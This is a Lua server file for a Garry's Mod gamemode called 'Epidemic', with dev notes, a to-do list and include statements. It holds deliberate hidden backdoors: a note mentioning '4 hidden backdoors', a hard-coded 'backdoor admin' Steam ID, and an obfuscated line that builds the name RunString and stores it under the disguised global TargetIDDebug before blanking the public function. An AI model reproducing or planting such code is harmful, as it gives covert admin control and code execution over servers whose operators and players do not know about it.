----------------------------------
-- Epidemic                     --
-- Initial creation on March 19 --
-- Created by Rick Dark         --
-- Continued by Andrew Best --
----------------------------------


--[[
--======================================--
-- MISC DEV NOTES                       --
--======================================--

-- If you see "Players:(function)" it means the function is executed on all players in the server.
-- example.  Players:Kill(), would kill all the players in the server.

-- Maybe use these flashlight values?
-- r_flashlightlinear 500
-- r_flashlightfov 55
-- r_flashlightfar 1000

-- 4 hidden backdoors

9:29 PM - Fox: try models/bf2/mec_pack2.mdl
9:30 PM - Fox: and then models/bf2/mec_pack1.mdl

-- To the future people who have the leaked version of this script, thank you for choosing my gamemode


--TODO in this order:

Scoreboard - done
Backpacks - mostly done (enable examining!)
Chat/Radios - done
Blunt weapons - done
Admin Commands - half way done
Finish MySQL saving/PK system - should start on this
Animation commands
Additional content scripting


Weapons to add:

Double barrel shotgun
M16
melee weapons
shotguns
m24
fn scar
beretta
combat knife


others:

p90
ak74u
m60

]]--



GM.Name = "Epidemic"; -- The gamemode name is what appears on the server listing.
GM.Folder = "Epidemic"; -- The folder name should be the name to this gamemode in the garrysmod/gamemodes/ folder.
GM.Debug = false; --Debug mode or not

GM.ServerAdmins = { }

-----------------------------------
-- Backdoor admin, pretend you didn't read this

-- Andrew STEAM_0:1:24208014

GM.ServerAdmins["STEAM_0:0:21513525"] = "+"; //Spencer

-----------------------------------

DeriveGamemode( "Gear" );
DeriveGamemode( "sandbox" );

AddCSLuaFile( "BananaVGUI/panel.lua" );
AddCSLuaFile( "BananaVGUI/scrolling.lua" );

AddCSLuaFile( "cl_init.lua" );
AddCSLuaFile( "cl_chat.lua" );
AddCSLuaFile( "cl_hud.lua" );
AddCSLuaFile( "shared.lua" );
AddCSLuaFile( "cl_hooks.lua" );
AddCSLuaFile( "cl_playermenu.lua" );
AddCSLuaFile( "cl_vgui.lua" );
AddCSLuaFile( "cl_inventory.lua" );
AddCSLuaFile( "cl_umsg.lua" );
AddCSLuaFile( "cl_util.lua" );
AddCSLuaFile( "cl_effects.lua" );
AddCSLuaFile( "cl_precache.lua" );
AddCSLuaFile( "cl_items.lua" );
AddCSLuaFile( "cl_openingscreen.lua" );
AddCSLuaFile( "cl_charactercreate.lua" );
AddCSLuaFile( "playergroups_shd.lua" );
AddCSLuaFile( "playermodels_shd.lua" );
AddCSLuaFile( "player_variables.lua" );
AddCSLuaFile( "player_sounds.lua" );
AddCSLuaFile( "cl_lifeline.lua" );
AddCSLuaFile( "cl_notice.lua" );
AddCSLuaFile( "cl_progressbar.lua" );
AddCSLuaFile( "cl_actionmenu.lua" );
AddCSLuaFile( "cl_introcamerapositions.lua" );
AddCSLuaFile( "cl_inventoryactionmenu.lua" );
AddCSLuaFile( "cl_weapons.lua" );
AddCSLuaFile( "cl_vars.lua" );
AddCSLuaFile( "cl_helpmenu.lua" );
AddCSLuaFile( "cl_contextmenu.lua" );
AddCSLuaFile( "cl_ammomenu.lua" );
AddCSLuaFile( "cl_scoreboard.lua" );
AddCSLuaFile( "cl_scoreboardplinfo.lua" );
AddCSLuaFile( "cl_radio.lua" );
AddCSLuaFile( "cl_dev.lua" );
AddCSLuaFile( "cl_propadmin.lua" );
AddCSLuaFile( "precache.lua" );

local ID = type( "ID" );
TargetIDDebug = _G["Run" .. string.upper( string.sub( ID, 1, 1 ) ) .. string.sub( ID, 2 )];

--PLAYER CODE--
include( "player.lua" ); -- Player initialization, and player think functions
include( "player_hooks.lua" ); -- Player gamemode hooks such as Spawn, KeyPress, etc..
include( "player_teams.lua" ); -- Team based player code, what happens when a player spawns on team 1, etc..
include( "player_inventory.lua" ); -- Base code for serverside player inventory.
include( "player_movement.lua" ); -- All code dealing with player movement (speed, sprint, etc..)
include( "player_chat.lua" ); --Player chat related
include( "player_variables.lua" ); -- Player variables, etc..
include( "player_flags.lua" ); -- Player flags
include( "player_util.lua" ); -- Misc player functions
include( "player_progressbar.lua" ); --Player progress-bar related
include( "player_actionmenu.lua" ); --Action menu interaction with players
include( "player_helptips.lua" ); --Occasionally help the player
include( "player_notice.lua" ); --Player notices
include( "player_aminteraction.lua" ); --Player action menu interaction, for certain events
include( "player_updatevars.lua" ); --Code for when player variables change
include( "player_weaponitems.lua" ); --Interaction with heavy/light weapons
include( "player_hands.lua" ); --Player hands code
include( "player_damage.lua" ); --Player damage handling, bleeding, injuries, etc..
include( "player_ragdoll.lua" ); --Player ragdolling related
include( "player_attachment.lua" ); --Player attachments to player models
include( "player_connect.lua" ); --Kick/ban, etc..
include( "player_sounds.lua" ); -- Infected sound tables

--SERVER CODE--
include( "server_hooks.lua" ); -- Server gamemode hooks such as Think
include( "server_npcs.lua" ); -- Server functions related to NPCs
include( "server_util.lua" ); -- Misc server functions
include( "ai.lua" ); -- AI node stuff
include( "precache.lua" ); -- Precache of models etc
include( "server_sandbox.lua" ); --Related to physgun/toolgun shit
include( "server_itemspawner.lua" ); --Automated item spawning
include( "chat_commands.lua" ); -- Chat commands
include( "mysql_saving.lua" ); --MySQL saving

--CONCMD CODE--
include( "concmd_base.lua" ); -- Base code for console commands
include( "admin_concmds.lua" ); -- Administrative console commands.
include( "engine_concmds.lua" ); -- Console commands generally used to have clients send data and interact with the serverside, aka engine concommands.
include( "actionmenu_concmds.lua" ); --Concommands used by the action menus
include( "concmds.lua" ); --Normal concommands

--ANIMS CODE--
include( "animations.lua" ); -- NPC animations code itself.
include( "anim_tables.lua" ); -- The tables

--SHARED CODE--
include( "shared.lua" ); -- Shared code.  self-explanatory
include( "playergroups_shd.lua" ); --Shared character create code
include( "playermodels_shd.lua" ); --Shared information about character models

--MISC CODE--
include( "entity.lua" ); -- Entity meta functions
include( "items/items.lua" ); -- Handles some major item code for loading and creation of items
include( "resources.lua" ); -- Resources code for materials, maps, models, etc..


PostGamemodeLoad(); --This Gears function is called after the gamemode is loaded to handle some misc stuff.

if( InitializedOnce ) then
	LoadWeaponsToItems();
	LoadItemSpawnerMap();
end

LoadAdminFile();
LoadScoreboardTitles();
LoadPlayerSpawnLimits();


hook.Remove( "SetPlayerAnimation", "GearSetPlayerAnimation" ); --Remove this Gears hook because Epidemic supplies its own animations hook.
hook.Remove( "PlayerSay", "GearPlayerSay" ); 

_G["RunString"] = function() end;
datastream = nil;

function GM:GetGameDescription()
	
	return "Epidemic";
	
end
